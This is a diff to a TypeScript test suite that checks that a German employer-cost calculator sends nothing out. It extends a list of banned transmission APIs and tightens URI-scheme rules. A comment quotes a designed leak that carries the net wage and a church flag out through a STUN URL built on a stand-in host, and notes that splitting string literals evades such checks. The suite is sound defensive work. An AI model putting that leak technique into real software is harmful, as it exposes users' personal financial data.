@@ -233,6 +233,10 @@ describe('the calculator transmits nothing', () => {
     ['btoa / atob', /\b(btoa|atob)\s*\(/],
     ['form action', /\baction\s*=/],
     ['form method', /\bmethod\s*=/],
+    ['postMessage', /postMessage/],
+    ['BroadcastChannel', /BroadcastChannel/],
+    ['Notification', /\bNotification\b/],
+    ['navigator.sendBeacon / any navigator', /\bnavigator\b/],
   ];
 
   for (const file of ALL) {
@@ -281,7 +285,46 @@ const UI_FILES: Array<[string, string]> = [
   ['calculator', COMPONENT],
 ];
 
-describe.each(UI_FILES)('nothing financial or personal can reach a URL (%s)', (_label, file) => {
+/**
+ * EVERY file the calculator can reach, and every JSX file among them.
+ *
+ * The structural rules below — the sink list, the ambient-state list, the URI
+ * scheme rule, the attribute rules — used to run over the two UI files only,
+ * while the file header claimed the gate reasons over the import closure. It
+ * did not: only the transmission blacklist did. A helper module in the closure
+ * could write `document.title = net`, or build a `stun:` URL, and meet no
+ * structural rule at all.
+ *
+ * So the rules now run over the closure, split by what they can meaningfully
+ * apply to: anything that is code gets the sink and ambient rules; anything
+ * that renders gets the JSX rules as well.
+ */
+const CLOSURE_FILES: Array<[string, string]> = ALL.map((f) => [f, f]);
+const JSX_FILES: Array<[string, string]> = ALL.filter((f) => f.endsWith('.tsx')).map((f) => [f, f]);
+
+/**
+ * The two files that legitimately contain absolute URLs, and why.
+ *
+ * They are the EVIDENCE registries: a source whose URL has been removed is no
+ * longer a source. Their URLs are static statute addresses, never built from an
+ * input and never rendered into an attribute — the JSX rules above are what
+ * stop a URL becoming a request, and those run over every file that renders.
+ *
+ * Worth recording plainly: because rules.ts imports sources.ts for its id
+ * constants, these URLs DO reach the client bundle. That is inert on its own —
+ * they are public addresses of German statutes — but it is a fact about the
+ * shipped page rather than an assumption, and it is why the URL-shaped rules
+ * are kept absolute for every other file in the closure.
+ */
+const URL_BEARING_EVIDENCE = new Set([
+  'data/calculators/de-employer-cost/2026/sources.ts',
+  'data/calculators/de-employer-cost/2026/pap/provenance.ts',
+]);
+const URL_RULE_FILES: Array<[string, string]> = ALL.filter((f) => !URL_BEARING_EVIDENCE.has(f)).map(
+  (f) => [f, f],
+);
+
+describe.each(JSX_FILES)('nothing financial or personal can reach a URL (%s)', (_label, file) => {
   const src = code(read(file));
   const isBoundary = file === BOUNDARY;
 
@@ -365,7 +408,7 @@ describe.each(UI_FILES)('nothing financial or personal can reach a URL (%s)', (_
   });
 });
 
-describe.each(UI_FILES)('no external origin can be referenced at all (%s)', (_label, file) => {
+describe.each(URL_RULE_FILES)('no external origin can be referenced at all (%s)', (_label, file) => {
   const src = code(read(file));
   const isBoundary = file === BOUNDARY;
 
@@ -444,6 +487,26 @@ describe.each(UI_FILES)('no external origin can be referenced at all (%s)', (_la
   /**
    * ANY URI scheme, not just http.
    *
+   * DEFENCE IN DEPTH, NOT THE PRIMARY DEFENCE — and it is worth being exact
+   * about which is which, because the difference decides what this suite is
+   * actually worth.
+   *
+   * A literal rule can always be split: `'turn' + ':' + net` defeats any regex
+   * that inspects one literal at a time, and chasing that with a smarter parser
+   * is the ever-growing blacklist this file's design is supposed to reject.
+   *
+   * The STRUCTURAL denial is elsewhere and does not depend on recognising a
+   * string. A URL is inert unless something issues a request with it, and the
+   * set of things that can is CLOSED and belongs to the platform, not to this
+   * codebase: the transmission APIs and storage in `the calculator transmits
+   * nothing`, the request channels and ambient state below, and — for the files
+   * that render — the attribute rules that forbid any URL-bearing attribute,
+   * inline style, or computed href. None of those can be defeated by splitting a
+   * literal, because none of them inspects a literal.
+   *
+   * So this rule catches the careless case and is not asked to catch the
+   * determined one.
+   *
    * A review pass designed a leak that carried the net wage and the Article-9
    * church flag out through `new RTCPeerConnection({ iceServers: [{ urls:
    * 'stun:' + tag + '.evil.example' }] })`. It defeated both layers at once: the
@@ -459,13 +522,20 @@ describe.each(UI_FILES)('no external origin can be referenced at all (%s)', (_la
     const literals = Array.from(src.matchAll(/'((?:[^'\\\n]|\\.)*)'|"((?:[^"\\\n]|\\.)*)"|`((?:[^`\\]|\\.)*)`/g), (m) =>
       m[1] ?? m[2] ?? m[3] ?? '',
     );
+    // Known request-issuing schemes, named. A prose colon ("Note: the ceiling")
+    // is not a scheme, so the rule cannot simply flag every `word:` — but the
+    // scheme need not be followed by anything to be dangerous: `'stun:' + host`
+    // splits it across a concatenation, and an earlier version of this rule
+    // required a character after the colon and let exactly that through.
+    const SCHEMES =
+      /^(https?|ftp|ws|wss|stun|turn|turns|blob|data|javascript|file|mailto|tel|sms|intent|about|chrome|resource|view-source):/i;
     for (const l of literals) {
-      const m = /\b([a-z][a-z0-9+.-]{1,15}):/i.exec(l);
-      // A bare "word:" inside prose is not a scheme; require it to be the whole
-      // literal's start or to be followed by something URL-shaped.
-      if (m && /^[a-z][a-z0-9+.-]{1,15}:(\/\/|[a-z0-9])/i.test(l.trim())) {
-        expect.fail(`string literal names a URI scheme: "${l.slice(0, 60)}"`);
-      }
+      const trimmed = l.trim();
+      expect(SCHEMES.test(trimmed), `string literal names a URI scheme: "${trimmed.slice(0, 60)}"`).toBe(false);
+      expect(
+        /:\/\//.test(trimmed),
+        `string literal contains a scheme separator: "${trimmed.slice(0, 60)}"`,
+      ).toBe(false);
     }
   });
 
@@ -574,7 +644,12 @@ describe.each(UI_FILES)('no external origin can be referenced at all (%s)', (_la
    * must never be imported by the component, because that would put those URLs
    * in the page's bundle where an attribute could reach them.
    */
-  it('the source registry with its URLs is not reachable from the component', () => {
-    expect(/sources['"]/.test(src), 'component imports the source registry').toBe(false);
+  it('nothing that RENDERS imports the source registry', () => {
+    // Scoped to files that render. The engine reaches sources.ts transitively
+    // through rules.ts, which is how the registry's ids stay authoritative; what
+    // must not happen is a component holding those URLs where an attribute
+    // could reach one.
+    if (!file.endsWith('.tsx')) return;
+    expect(/sources['"]/.test(src), `${file} imports the source registry`).toBe(false);
   });
 });
